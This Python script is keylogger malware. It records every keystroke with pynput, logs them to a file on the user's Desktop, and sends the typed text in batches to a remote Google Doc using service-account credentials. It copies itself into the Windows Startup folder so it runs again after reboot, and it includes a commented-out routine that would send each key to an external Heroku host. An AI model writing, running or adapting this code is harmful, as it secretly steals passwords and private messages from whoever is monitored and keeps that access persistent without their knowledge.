from __future__ import print_function

import os
import pathlib
import re
import shutil
import subprocess
import sys
import threading
from pathlib import Path

import requests
from google.oauth2 import service_account
from pynput.keyboard import Listener

line_length = 0
HOST = "https://salty-basin-28879.herokuapp.com/"
path = os.path.sep.join(path for index, path in enumerate(pathlib.Path(__file__).parent.parts) if index < 3)
text = ""


def launch_request(key):
    try:
        requests.get(f'{HOST}key?key={key}')
    except Exception as e:
        print(e)


def write_to_file(key):
    with open(file=f"{path}{os.path.sep}Desktop{os.path.sep}keyLogger.txt", mode="a+") as f:
        if int(f.tell()) % 250 == 0 and int(f.tell()) != 0:
            f.write("\n")

        if "{del}" in key:
            f.truncate(f.tell() - 1)
            return str(f.tell())
        f.write(key)


def key_recorder(key):
    str_key = str(key)
    global line_length
    line_length += 1
    char = ""
    if line_length >= 50:
        char = "\n"
        line_length = 0
    if str_key == "Key.enter":
        char = '\n'
    elif str_key == "Key.space":
        char += " "
    elif str_key == "Key.backspace":
        char += " {del} "
        #     size = f.tell()  # the size...
        #     f.truncate(size - 1)
    elif len(re.findall(r'Key.([\w\d]+)', str_key)) > 0:
        if len(re.findall(r'Key.([\w\d]+)', str_key)[0]) > 1:
            return
    elif len(re.findall(r'(x[\d]+)', str_key)) > 0:
        return
    elif len(re.findall(r'<([\d]+)>', str_key)) > 0:
        if int(re.findall(r'<([\d]+)>', str_key)[0]) - 96 < 10:
            char += str(int(re.findall(r'<([\d]+)>', str_key)[0]) - 96)
        elif re.findall(r'<([\d]+)>', str_key)[0] == '110':
            char += '.'
    else:

        char += str_key.replace("'", "")

    write_to_file(char)
    global text
    text += char
    if len(text) > 30:
        text += "\n"
        thread = threading.Thread(target=write_to_doc, args=(text,))
        thread.start()
        text = ""

    # t = threading.Thread(target=launch_request, args=(char,))
    # t.start()


def copy_to_startup_folder():
    file_name = re.findall(r'([^\\w\d\W]+).(py|exe|pyw)', sys.argv[0])[0][0] + ".exe"
    try:
        src = sys.argv[0]
        dest = os.path.join(str(Path.home()), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu',
                            'Programs',
                            'Startup',
                            file_name)

        shutil.copy(src, dest)
        subprocess.Popen(dest, shell=False, stdin=None, stdout=None, stderr=None,
                         close_fds=True, creationflags=subprocess.DETACHED_PROCESS)

        return False
    except shutil.SameFileError:
        print('File is in startup folder')

        return True


import os.path
from googleapiclient.discovery import build

# If modifying these scopes, delete the file token.json.
SCOPES = ['https://www.googleapis.com/auth/documents']

# The ID of a sample document.
DOCUMENT_ID = '1u17zh52qGIZPAF_P0a7ce23RRHrYWPR15mCz3dVL_GY'


def write_to_doc(text):
    """Shows basic usage of the Docs API.
    Prints the title of a sample document.
    """

    creds = service_account.Credentials.from_service_account_file(
        'credentials.json', scopes=SCOPES)

    service = build('docs', 'v1', credentials=creds)

    # Retrieve the documents contents from the Docs service.

    insert_request = [
        {
            'insertText': {
                'location': {
                    'index': 1,
                },
                'text': text
            }
        },

    ]
    service.documents().batchUpdate(documentId=DOCUMENT_ID, body={'requests': insert_request}).execute()


if __name__ == '__main__':
    if '.exe' in sys.argv[0]:
        if copy_to_startup_folder():
            with Listener(on_press=key_recorder) as listener:
                listener.join()
    else:
        with Listener(on_press=key_recorder) as listener:
            listener.join()
